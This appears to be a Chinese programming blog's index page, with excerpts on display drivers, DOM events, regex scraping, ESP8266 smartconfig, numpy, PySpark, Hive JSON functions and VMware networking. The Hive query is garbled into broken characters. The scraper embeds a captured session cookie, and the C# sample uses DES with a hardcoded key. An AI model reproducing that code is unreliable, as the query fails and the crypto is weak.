上面代码创建了一个Kobj目录，dev_disp.c文件中有三分之一的代码是为了实现disp_attribute_group。
Display初始化 接下来重点分析disp_init()：
static s32 disp_init(struct platform_device *pdev) { （1）初始化disp_drv_info g_disp_drv，调用parser_disp_init_para()解析DST信息保存到g_disp_drv.disp_init （2）调用bsp_disp_init()对Display进行初始化 （3）调用lcd_init()进行LCD驱动初始化 （4）调用fb_init()完成Framebuffer驱动初始化 （5）调用composer_init()，初始化渲染器 （6）start_process()，开始输出显示画面 } bsp_disp_init()–&gt;bsp_disp_set_print_level() 设置是否需要打印display驱动信息
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b03abfa9364e9cd88de9fe5c137b04ed/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f1eee25ba780ca442f82a5dbc9ebd612/" rel="bookmark">
			第十五讲 DOM编程（三）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系列课程目录 第十五讲 DOM编程（三）
目录 系列课程目录前言一、DOM事件绑定1.DOM0级别事件绑定1.DOM2级别事件绑定3.DOM0级事件和DOM2级事件区别4.事件传参5.常用事件 二、课堂作业1.按照要求完成任务2.解析代码 前言 JavaScript 操作DOM对象 提示：以下是本篇文章正文内容，下面案例可供参考
一、DOM事件绑定 1.DOM0级别事件绑定 DOM0级别：DOM最早版本的事件绑定方式，被所有浏览器兼容 HTML绑定
JS绑定
JS绑定事件时，不能加()，否则会在页面加载时立即执行
可以绑定匿名函数
1.DOM2级别事件绑定 DOM2级别：添加了两个监听方法来添加和移除事件处理程序 addEventListener()
第一个参数为事件名，不加on
第二个参数为函数名，不加引号
第二个参数为函数名，不加括号(）
可以绑定匿名函数
removeEventListener()
无法移除匿名添加的函数
3.DOM0级事件和DOM2级事件区别 DOM0级事件只能绑定一个函数，前面绑定的函数会被覆盖 DOM2级事件只能可以绑定多个函数，且有执行顺序 DOM0级事件与DOM2级事件互不影响 DOM2级事件拥有事件流，分为三个阶段 捕获事件阶段处于目标阶段事件冒泡阶段 可通过第三个可选参数控制事件流 *此处仅了解即可
4.事件传参 无法绑定成功，加括号会直接执行
行内绑定，注意加引号
使用匿名函数
event为默认参数，不需传入即可调用，该对象表示触发的事件本身
event.target会返回触发该事件的目标元素
行内调用时，传入this，this代表该元素本身
5.常用事件 练习：用户在输入框内输入任意字符，每输入一个字符，下方出现输入的字符
按下Enter键后，弹出alert框，显示用户输入(提示：可通过event.code判断用户按下的按键)
答案：
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;input type="text" name="" id="vl" value="" onkeyup="check()"/&gt; &lt;p id="text"&gt;&lt;/p&gt; &lt;script type="text/javascript"&gt; function check(){ document.getElementById("text").innerHTML=document.getElementById("vl").value if(event.code=="Enter"){ alert(document.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f1eee25ba780ca442f82a5dbc9ebd612/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6a979b3dda89f61575ffad371a53ad1/" rel="bookmark">
			在正则表达式里match、search、finda
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在正则表达式里match、search、finda 贪婪匹配，会尽可能的往后匹配 非贪婪匹配，会尽可能少的匹配，是否加？影响匹配结果的长度，常用该匹配规则 搜索限制 re.match(pattern,string,flags=0) 如果string开始的0或者多个字符匹配到了正则表达式样式，就返回一个相应的匹配对象。如果没有匹配，就返回None；注意它跟零长度匹配是不同的。
re.search(pattern,string,flags=0) 扫描整个字符串找到匹配样式的第一个位置，并返回一个相应的匹配对象。如果没有匹配，就返回一个None；注意这和找到一个零长度匹配是不同的。
re.fullmatch(pattern,string,flags=0) 如果整个string匹配到正则表达式样式，就返回一个相应的匹配对象。否则就返回一个None；注意这跟零长度匹配是不同的。
下面给大家分享一个抓取猫眼电影的数据：
import requests, re def get_conent(url): headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36', #当页面获取不到,建议添加cookie请求头.--有些网站会通过这个请求屏蔽数据--有时效性的 'Cookie': '__mta=209663277.1619485345594.1619487043357.1619487055059.11; uuid_n_v=v1; uuid=4F09DE90A6F411EB90DD27FA8DE7664710A175703E1A438EB860418AF68D1EFC; _csrf=7b73e39d8867f941defa5d850eb179755cf3069d18b5fd21c74a4d6ceccf5969; Hm_lvt_703e94591e87be68cc8da0da7cbd0be2=1619485346; _lx_utm=utm_source%3DBaidu%26utm_medium%3Dorganic; _lxsdk_cuid=17910d94713c8-02b8f6d017ebd3-67121d7a-c0000-17910d94713c8; _lxsdk=4F09DE90A6F411EB90DD27FA8DE7664710A175703E1A438EB860418AF68D1EFC; __mta=209663277.1619485345594.1619485345594.1619485349762.2; Hm_lpvt_703e94591e87be68cc8da0da7cbd0be2=1619487055; _lxsdk_s=17910d94714-8d8-6ee-467%7C%7C27', } response = requests.get(url, headers=headers) return response.text def parse_page(page_content): ''' 使用正则提取页面数据 :param page_content: :return: ''' #正则提取数据的规则:一步一步缩小匹配范围,做到精确匹配. # print(page_content) #正则匹配出现问题,首先应该查看原页面内容是否正确获取到 #第1步:取出dl #re.S--&gt;.*?万能的功能 dl_c = re.search(r'&lt;dl class="board-wrapper"&gt;(.*?)&lt;/dl&gt;',page_content,re.S).group(1) # print(dl_c) #第2步:获取每一个dd dd_list = re.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b6a979b3dda89f61575ffad371a53ad1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/553dde230456b2ec58f5430bd1967764/" rel="bookmark">
			esp8266教程：smartconfig智能配网
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		公众号 欢迎扫码关注本人微信公众号：公众号上分享更多嵌入式知识和资料，分享个人学习嵌入式的心得体会。欢迎大家一起来玩呀。
esp8266教程目录 文章目录 公众号 esp8266教程目录前言一、ESP smartconfig是什么？1.1、常用的配网方式配网方式1：配网方式2： 二、代码实现1.代码路径2.测试 总结 前言 我们的手机有显示屏有触摸屏，可以使用界面的的方式选择连接那个wifi，然后输入密码用于连接网络。对于iot设备来说没有触摸屏也没有显示屏，如何把wifi名字和wifi密码传输到iot设备呢？为了解决这个问题所以就有了smartconfig。 一、ESP smartconfig是什么？ ESP smartconfig为ESP8266提供的两种智能配网使用demo，分别有ESPTouch和AirKiss，或者ESPTouch和AirKiss同时共存。ESPTouch为乐鑫研发的一种配网方式，AirKiss为TI研发的中配网方式，两种方式原理差不多。 1.1、常用的配网方式 配网方式1： 第一种是AP模式的方式配网，AP模式就是lot设备像路由器那样生成一个wifi，手机连接lot设备生成的wifi。iot设备运行一个tcp server，手机为tcp client，然后手机通过一个tcp方式将家庭路由器wifi的SSID和Password发送到iot设备。lot设备接收到wifi账号和密码之后从AP模式切换回Station模式，然后用过手机发送下来的SSID和Password连接家庭的路由器，lot连接上家庭路由器wifi之后，广播UDP数据包，数据包里面有lot设备名字和设备id和ip地址。手机在发送完家庭路由的wifi SSID和Password之后断开lot的wifi去连接家庭路由器wifi，然后监听等lot设备连上路由wifi后的发送的UDP数据包，然后通过UDP数据包中lot设备名字和设备id和ip地址知道那个设备已经连接上家庭路由，然后显示出来通知用户。 配网方式2： 第二种配网方式就是我们要说的smartconfig方式，上面的AP模式的成功率为100%，但是有一点不好的是非常繁琐需要用户连接lot设备的wifi，smartconfig的方式优点是配网方式十分简单，但是不好的地方为由可能会配网失败或者有的家庭路由器不支持。smartconfig的原理是需要配网的iot设备配置为混杂模式，监听网络中的所有报文，然后手机发送UDP报文，在UDP报文中含有家庭路由的wifi密码和wifi ssid名字，因为在2.4g这个频段中有非常多的UDP报文和且有十几信道，所以iot需要解析很多报文，而且还需要不断的切换信道去抓取，所以有可能抓不到手机发送出来的UDP报文，从而配置失败。 二、代码实现 1.代码路径 ESP8266_RTOS_SDK\examples\wifi\smart_config\main\smartconfig_main.c
代码如下（示例）：
#include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include "freertos/FreeRTOS.h" #include "freertos/task.h" #include "freertos/event_groups.h" #include "esp_wifi.h" #include "esp_event_loop.h" #include "esp_log.h" #include "esp_system.h" #include "nvs_flash.h" #include "tcpip_adapter.h" #include "esp_smartconfig.h" #include "smartconfig_ack.h" /* FreeRTOS event group to signal when we are connected &amp; ready to make a request */ static EventGroupHandle_t wifi_event_group; /* The event group allows multiple bits for each event, but we only care about one event - are we connected to the AP with an IP?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/553dde230456b2ec58f5430bd1967764/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0fee8a07f78a7dbea94f8e16fe1d65a/" rel="bookmark">
			c学习47-虚函数（多态）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 多态
1. C++中的虚函数的作用主要是实现了多态的机制。关于多态，简而言之就是用父类型别的指针指向其子类的实例，然后通过父类的指针调用实际子类的成员函数。这种技术可以让父类的指针有“多种形态”，这是一种泛型技术。
2. 所谓泛型技术，说白了就是试图使用不变的代码来实现可变的算法。比如：模板技术，RTTI技术，虚函数技术，要么是试图做到在编译时决议，要么试图做到运行时决议。
2. 多态特点
1. 多态是在不同继承关系的类对象，去调同一函数，产生了不同的行为。
2. 就是说，有一对继承关系的两个类，这两个类里面都有一个函数且名字、参数、返回值均相同，然后我们通过调用函数来实现不同类对象完成不同的事件。
3. 构成条件
调用函数的对象必须是指针或者引用。被调用的函数必须是虚函数，且完成了虚函数的重写。 4. 虚函数表
1. 虚函数（Virtual Function）是通过一张虚函数表（Virtual Table）来实现的。简称为V-Table。在这个表中，主是要一个类的虚函数的地址表，这张表解决了继承、覆盖的问题，保证其容真实反应实际的函数。有虚函数的类的实例中这个表被分配在了这个实例的内存中。当我们用父类的指针来操作一个子类的时候，这张虚函数表就显得由为重要了，它就像一个地图一样，指明了实际所应该调用的函数。
2. C++的编译器应该是保证虚函数表的指针存在于对象实例中最前面的位置（这是为了保证取到虚函数表的有最高的性能——如果有多层继承或是多重继承的情况下）。所以假如对象A的类有虚函数，那么对象A首地址“&amp;A”就是虚函数表的地址。
5. 虚函数“地址调用”的分析
解析“(Fun)*(int*)*(int*)(&amp;base27_b_01)” (&amp;base27_b_01) 是虚函数表地址 (int*)(&amp;base27_b_01) 强转为(int*) 类型 *(int*)(&amp;base27_b_01) 解引用，表示虚函数表（非虚函数表地址）,也是虚函数表的第一个函数指向入口地址 (int*)*(int*)(&amp;base27_b_01) 强转为(int*) 类型 *(int*)*(int*)(&amp;base27_b_01) 解引用，表示第一个虚函数（入口地址，函数首地址，真实的函数代码） (Fun)*(int*)*(int*)(&amp;base27_b_01) 再强转为自定义的函数指针，就可以调用了 总结是：两次解引用，三次强制转换。第一次解引用到真实虚函数表也是函数指向入口地址， 第二次解引用表示真正的函数代码段，函数入口地址，函数首地址 重要区分：表与表地址，函数与函数地址，指向函数入口地址与入口地址 6. 索引
1. 不用虚函数，派生类对基类成员函数重定义，基类指针赋值为子类的对象引用，调用的成员函数是基类成员函数。 2. 采用虚函数，派生类对基类成员函数重定义，基类指针赋值为子类的对象引用，调用的成员函数是子类成员函数。 3. 虚函数表 4. (Fun)*(int*)*(int*)(&amp;base27_b_01) 因为我的系统指针占8位，转成(int*)类型会告警，那么转成(long*)怎么样？ 5. gdb查看虚函数入口地址 ————————————————————————————————————————-
1. class base27_A{//基类 public: void fun27_01(){//非虚函数 printf("我是基类\n"); } }; class class27_A:public base27_A{//子类1 public: void fun27_01(){ printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a0fee8a07f78a7dbea94f8e16fe1d65a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d5ef4a67628a08a1c67c9df6e7f8509f/" rel="bookmark">
			Python库之numpy之数组切片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		众所周知，python中有很多的库，numpy就是其中的一个库，做数据分析必备的库之一，
今天就让我们来学一下，numpy的切片
今天上课学这个切片切的我快自卑了，为啥为啥，脑子里全是为啥，为啥不是我想要的结果呢？后来花了半小时弄懂终于弄懂了，年轻人还是需要一些锲而不舍的精神的
首先让我们定义一个多维数组
方法一：
1：导入numpy
import numpy as np 2:定义一个数组（我发现用Spyder还是挺好用的，可以看到数据，不用输出）
D=np.array([[1,2,3,4],[5,6,7,8],[9,10,11,12],[13,14,15,16]]) 数组是这样的：（索引值从0开始索引）
切片开始，准备好了吗？
1：先让我们来切出第一行
切片原理：切片多维数组就是前面表示行，后面表示列，用中括号括起来（这个不多说，下面的代码解释）
A=D[1] #这两条代码都能得到数组的第一行 A1=D[1,:] 2：切出第一列（若只有一维数据，则在Spyder里会以列的形式排列）
B=D[:,1] 3：取出D中行为1，列为2的数据，注意下标是从0开始的、
B1=D[1,2] 4：访问第1,3列数据
B2=D[:,[1,3]] 5:访问第1,3行数据
B3=D[[1,3],:] 6：取D中满足第0列大于5的所有列数据(:表示所有的行或是是列)
C=D[D[:,0]] 7:取D中满足第0中大于5的第2,3列数据
按逻辑我们应该是这样写的:
C1=D[D[:,0]&gt;5,[2,3]] 看看上面的数据，你发现了什么？他只取了两个数，是他出错了吗？我们需要的是两列呀，为什么会这样呢？
原因：在numpy中设置行与列同时都是有条件限制，且都为多个限制用【】隔开时，只取行列一一对应的值。
上面的数相当于：
C1=D[[2,3],[2,3]] python中数组切片默认取值，第二行第二列下的元素与第三行第三列下的元素
那么如果我们想要取出：D中满足第0中大于5的第2,3列数据，怎么取呢？
C2=D[D[:,0]&gt;5,2:4] 总结点：
1：在numpy中，【】表示一个限制符号，前后需要一一位置对应取值，若想去规定行列的全部元素而不是单个元素来取值则需要将行列数值范围限制放在同一个【】中
2：行列规范范围，取左不取右，C2=D[D[:,0]&gt;5,2:4]中列限制范围2:4，只取到了2,3列第四列没取
8：取D中满足第0列大于5的第1,2列数据
C3=D[D[:,0]&gt;5,1:3] 9:加入逻辑运算，计算出#取D中第0，3行的所有列数据，本质上行及控制为逻辑列表，去逻辑值为真
TF=[True,False,True,False] D1=D[TF,:] #取出第0,3行的2,3列的元素 Dt4=[D[TF,2:4]] 10：取出D中大于4的数据
Dt5=D[D&gt;4] 总结：当数据没有特殊行或者列的规定时，取出来的值为行列平行，就为一列
11：取中间几个元素,6,7,10,11（可以直接取值）
可以借助切片 : 或 … 与索引数组组合。
middle=D[1:3,1:3] 方法二：
要是一开始就先看了这方法，那我也不至于想了那么久还是没想明白，推荐一直使用这个方法，因为这个方法不仅好用，而且符合我们大脑的逻辑。
1：首先还是需要导入包：
import numpy as np 2：定义数组
D=np.array([[1,2,3,4],[5,6,7,8],[9,10,11,12],[13,14,15,16]]) 3：取第1,2行，1,3列
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d5ef4a67628a08a1c67c9df6e7f8509f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8833d40542d2fe45fbe9c520e117dbc/" rel="bookmark">
			windows下pycharm搭建spark环境，并成功运行（附代码）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		windows下spark的安装和运行 建议看到这篇文章(描述非常详细) Spark在Win10下的环境搭建
一、创建项目和.py文件 二、在pycharm中添加spark环境 若是左侧的python中没有，可点击‘’+‘’号进行添加
配置spark环境：总共3个（SPARK_HOME、HADOOP_HOME、PYTHONPATH）
（注：SPARK_HOME和HADOOP_HOME已在系统的环境变量添加，故这里不再添加）
在编写代码时，建议添加如下代码，保证程序能够运行成功：
import os import sys import findspark # 一定要在最前面导入 '''初始化spark环境''' findspark.init() # Path for spark source folder os.environ['SPARK_HOME'] = "G:\Spark\Install\spark-2.4.3-bin-hadoop2.7" # Append pyspark to Python Path sys.path.append("G:\Spark\Install\spark-2.4.3-bin-hadoop2.7\python") '''示例''' from pyspark import SparkContext,SparkConf from pyspark.sql import SparkSession from pyspark.sql import Row # SparkContext是spark功能的主要入口 sc = SparkContext("local", "app") RawSalesDataRDD = sc.textFile("G:\\Spark\\作业\\taxi.csv") print(RawSalesDataRDD.take(5)) salesRDD = RawSalesDataRDD.map(lambda line: line.split(",")) print(salesRDD.take(5)) taxi_Rows = salesRDD.map(lambda p: Row( id=p[0], lat=p[1], lon=p[2], time=p[3] )) sqlContext = SparkSession.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f8833d40542d2fe45fbe9c520e117dbc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dddb2c2f82a7d8295bf27fd4e955f350/" rel="bookmark">
			数组删除指定元素
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ES6删除数组中指定元素，例：
let array = [1, 2, 3, 4];
删除2，array.splice(array.findIndex(item =&gt; item === 2), 1);
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/016c414d2189a591cdc3f535144816b1/" rel="bookmark">
			实现layui数据表单添加行功能（最新解决办法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个解决方案分两种情况
1.如果你的table中并没有url，那么这个很好解决，先获取到目前table中的数据，然后添加一行，在重新加载一下就可以了 var dataBak = []; //定义一个空数组,用来存储之前编辑过的数据已经存放新数据 var tableBak = table.cache.stock_add_table; //获取之前编辑过的全部数据，前提是编辑数据是要更新缓存，stock_add_table 为表格的id for (var i = 0; i &lt; tableBak.length; i++) { dataBak.push(tableBak[i]); //将之前的数组备份 } 在尾部新增一行空数据，实现增行效果 dataBak.push({ "stockInCargo": "" ,"stockInNum": "" ,"stockInPrice": "" ,"stockCargoTime": "" ,"stockInCompany": "" }); table.reload("stock_add_table",{ data:dataBak // 将新数据重新载入表格 }) 2.如果你的table中是通过url访问的，那么这种方法就不行了，以为reload会重新调用url中的方法，我们可以通过where的方式拼接参数来通过后台数据添加列 前台代码： table.reload("test",{ url:'http://localhost:10002/customer/get', where:{type:'add'}//通过where拼接参数 }); 后台代码： public Result getCustomer(int page,int limit,String type){ PageInfo&lt;Customer&gt; customers = customerService.getCustomers(page,limit); CustomerVo customerVo = new CustomerVo(); customerVo.setCount(customers.getTotal()); List&lt;Customer&gt; list = customers.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/016c414d2189a591cdc3f535144816b1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10375e4a66bc56c548df9a7d3e960305/" rel="bookmark">
			C#字符串DES加密和解密
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		using System; using System.IO; using System.Security.Cryptography; using System.Text; namespace Demo { class Program { private static byte[] Keys = { 0x22, 0x34, 0x76, 0x58, 0x90, 0xAB, 0xAD, 0xBF }; private static string EncryptionKey = "LHdpz520"; static void Main(string[] args) { string encryptStr = EncryptDES("Hello DES Encryption World!", EncryptionKey); //返回加密后的字符串 Console.WriteLine("\n=====================================\n"); Console.WriteLine($"加密后：\"{encryptStr}\""); string decryptStr = DecryptDES(encryptStr, EncryptionKey); //解密字符串 Console.WriteLine("\n=====================================\n"); Console.WriteLine($"解密后：\"{decryptStr}\""); Console.ReadLine(); } /// &lt;summary&gt; /// DES加密字符串 /// &lt;/summary&gt; /// &lt;param name="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/10375e4a66bc56c548df9a7d3e960305/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/591f2929a3fd18fdc22a757be711b896/" rel="bookmark">
			解决swagger2排序无效，亲测有用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文出处：https://www.cnblogs.com/mydotnetforyou/p/11943252.html
swagger：2.9.2
关于swagger 的配置 整合 就不多说了，这里主要说排序无效的原因。
@ApiSort(value = 5):给接口排序
@ApiOperationSupport(order = 1)：给接口里面的方法排序,如下：
@RestController @RequestMapping(value = "/api/message") @Api(tags = "接口-短信") **@ApiSort(value = 5)** @ApiIgnore() public class MessageController { @RequestMapping(value = "/ct", method = {RequestMethod.GET}, produces = {"application/json"}) @ApiOperation(value = "短信总数", notes = "获取短信总数") **@ApiOperationSupport(order = 1)** public Result CT() { ... } 最最重要的一点，这里一定要开启 增强功能。勾选后 保存 刷新，就OK 了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26419b990274e5e33f9c79b42e7d49cc/" rel="bookmark">
			hive中处理json数据的函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Hive中处理json数据的两种方式
第一种：将json数据作为字符串进行处理
使用函数：
get_json_object：解析json数据，返回对应的数据
json_tuple：UDTF函数
使用案例：
–创建数据：vim /export/datas/hivedata.json
{“id”: 1701439105,“ids”: [2154137571,3889177061],“total_number”: 493}
{“id”: 1701439106,“ids”: [2154137571,3889177061],“total_number”: 494}
–创建表：
create table tb_json_test1 (
json string
);
–加载数据
load data local inpath ‘/export/datas/hivedata.json’ into table tb_json_test1;
–处理读取
select
get_json_object(t.json,’ . i d ′ ) , g e t j s o n o b j e c t ( t . j s o n , ′ .id'), get_json_object(t.json,' .id′),getj​sono​bject(t.json,′.total_number’)
from
tb_json_test1 t ;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/26419b990274e5e33f9c79b42e7d49cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b4d555c5dd4bcd349d45d3c3fd2ef24/" rel="bookmark">
			VM网络配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VM网络配置 实测解决宿主机连接虚拟机，及虚拟机连接外网，完成ping www.baidu.com 一、配置虚拟网络编辑器
1、打开VMware
2、选择 编辑——&gt; 虚拟网络编辑器
3、选择 更改设置
4、选择 移除网络 ——&gt; 点击NAT模式 ——&gt; 添加网络 ——&gt; 随意选一个（我选的Vmnet10）——&gt; 确定
5、打开 NAT设置，记住网关地址，确定
二、配置网络适配器
1、选择 虚拟机 ——&gt; 设置
2、选择 网络适配器 ——&gt; 自定义 ——&gt; VMnet10（NAT模式）（选择自己上面添加的网络），选择确定
三、虚拟机网络配置
1、左键 右上角控制台 ——&gt; 有线 ——&gt; 有线设置
2、选择 设置按钮
3、选择 IPv4 ——&gt; 手动 ——&gt; 地址、子网掩码、网关 ——&gt; DNS ——&gt; 应用
其中 地址： 前三段和上面NAT设置中的网关ip一致，第四段从128-254之间随机取即可，我的129，即192.168.147.129
子网掩码： 统一 255.255.255.0
网关： 和上面NAT设置中的网关ip一致即可，我的192.168.147.2
DNS: 统一 114.114.114.114
四、终端配置
1、进入终端。通过ifconfig或者ip addr 查看自己ip是否更改（我的未更改，显示的还是自定义之前的ip地址，inet 192.168.233.129）
2、修改网卡配置文件，配置文件每个人不太一样，通过上图ifconfig看到配置文件名为ens33
# 通过vi命令来修改内容（可参考下面我的配置文件） vi /etc/sysconfig/network-scripts/ifcfg-ens33 # 以下为我配置文件中的内容 cat /etc/sysconfig/network-scripts/ifcfg-ens33 TYPE=Ethernet PROXY_METHOD=none BROWSER_ONLY=no BOOTPROTO=static DEFROUTE=yes IPV4_FAILURE_FATAL=no IPV6INIT=yes IPV6_AUTOCONF=yes IPV6_DEFROUTE=yes IPV6_FAILURE_FATAL=no IPV6_ADDR_GEN_MODE=stable-privacy NAME=ens33 UUID=105703e9-bdd6-4e0f-906b-2855e7cb26a2 DEVICE=ens33 ONBOOT=yes IPV6_PRIVACY=no IPADDR=192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8b4d555c5dd4bcd349d45d3c3fd2ef24/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8e36d0fc784fd632c8269149e6fbe0c/" rel="bookmark">
			第03节 VS2019 窗口布局介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、解决方案资源管理器
1.显示“解决方案”中的各种文件：包含项目、引用、头文件、源文件、资源文件等，可帮助管理项目文件。
2、选项中移除、排除、删除的区别：
移除、删除和排除分别描述了该项与项目或解决方案解除关联的不同程度。
移除：解除项与解决方案、项目或文件夹的关联但不移除其物理文件。
排除：临时解除项与项目的关联。
删除：永久清除物理存储区中的文件和解决方案、项目或文件夹中的文件项。
3、卸载和重新加载项目
卸载项目：可以临时使“解决方案”中的“项目”不可用。
3.1 在“解决方案资源管理器”中选择要卸载的“项目”。
3.2 在“项目”菜单上选择“卸载项目”，卸载后，该项目被标记为“已卸载”。
重新加载项目：恢复“解决方案”中标记“已卸载”的“项目”。
1.选择被标记“已卸载”的“项目”。
2.在“项目”菜单上选择“重新加载项目”。
二、类视图
1.如果你在VS界面上没有看到类视图，那么请在主菜单中的“视图”中单击“类视图”打开类视图。
2.对于面向对象开发语言开发的项目来讲，类视图非常重要。可以极大提高管理项目的便捷性。
3.在类视图下,项目展开后可看到各种类，包括映射、“宏和常量”、“全局函数和变量”等。
三、资源视图
1.显示资源视图方法：“视图”—“其它窗口”—“资源视图”；
2.资源视图可以展示出相应的资源，如MFC中的对话框资源、图标资源、字符串资源等。
四、属性视图
主要用途：更改项目及MFC项目中的各种控件的属性，在MFC中作用最大。
五、输出、错误列表视图
主要用途：输出程序生成的一些信息，显示程序编译期间的一些错误、警告等消息。
六、窗口布局的保存、应用、管理、重置
保存窗口布局：保存当前窗口布局；
应用窗口布局：应用保存的布局；
管理窗口布局：管理保存的多个布局；
重置窗口布局：恢复系统默认窗口布局；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43a52d17ade4edc2d285f4d6ea6a5e0e/" rel="bookmark">
			07--投资问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 7.3 投资问题–算法分析 问题
-解析
-设计
-分析
-源码
github:https://github.com/Tracy-Y0617/Tracy-Y0617/blob/main/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%9007.cpp 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5eff1089d4eaf7ac672d49c5e4e6581/" rel="bookmark">
			预测分析·民宿价格预测【和鲸社区】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		预测分析·民宿价格预测 赛题&amp;数据 赛题 民宿这一名词，是日语中“Minshuku”的音译。我国第一部关于民宿的旅游行业标准《旅游民宿基本要求与评价》已从2017年10月1日起开始实施，该标准定义：民宿是利用当地闲置资源，民宿主人参与接待，为游客提供体验当地自然、文化与生产生活方式的小型住宿设施。
2019年4月，Trustdata公布了《2019年中国在线民宿预订行业发展研究报告》，报告中公布的数据显示，2016-2019年，受旅游消费人数的增加及需求的拉动，在线民宿房源数和房东数同比增加，其中至2018年我国在线民宿的房源数达到107.2万个，而房东数达到32.5万个，初步核算，平均一个房东拥有3.3个民宿房源，较2016年每人约2个民宿房源数实现了明显的增加。
近年来，用于房东或者户主将闲置房产变为私人住宿服务已变得流行。在私人住宿中，业主根据房间的大小和位置来决定住宿价格，但要设定合理的价格并不容易。因此，在本次练习赛旨在引导我们尝试建立一个模型，该模型使用某私人住宿在线服务平台上发布的房地产数据来预测住宿价格。
数据说明 本次练习赛所使用数据集基于民宿价格数据集，并且针对部分字段做出了一定的调整，所有的字段信息请以本练习赛提供的字段信息为准
字段信息内容参考如下：
字段名数据类型字段描述数据IDstring数据的唯一ID，比如test_0，train_1024容纳人数int房间可以允许住几个人便利设施string房间提供的便利设施描述，如是否有电视空调洗手间数量float洗手间的数量床的数量int房间内床的个数床的类型int床的类型编码卧室数量int卧室的个数取消条款int取消条款的类型编码所在城市int民宿所在的城市编码清洁费int是否需要清洁费的0/1编码首次评论日期string民宿的首次评论日期房主是否有个人资料图片string民宿介绍中是否有房主个人资料照片房主身份是否验证int民宿房主身份是否验证过的0/1编码房主回复率string民宿房主消息回复率何时成为房主string房东何时成为该民宿的房主是否支持随即预订string是否支持随即预定最近评论日期string最近评论日期维度float民宿所在的维度经度float民宿所在的经度民宿周边string民宿周边的景区评论个数int民宿的历史评论个数房产类型int民宿的房产类型编码，如个人住宅、公寓等民宿评分float民宿的用户评分房型int房子类型编码，比如单间还是整间等邮编int民宿的邮编号码价格float民宿价格 数据下载 报名 -&gt; 进入组织 -&gt; 首页可查看数据
提交&amp;评审 提交方式 直接在赛事提交页面「上传」结果文件即可。
结果文件要求 提交文件必须为 csv 格式的文件，文件的字段信息如下：
字段名数据类型字段描述idInt数据的idpriceFloat民宿价格 客观评审 评测方法：
为了进行精度评估，使用了评估指标“ RMSE”。评估指标大于等于0，预测精度越高，该值越小。 评审说明
每支队伍拥有每天 5 次提交与测评排名的机会，排行榜实时更新，从高到低排序，若队伍一天内多次提交结果，新结果版本将覆盖原版本。
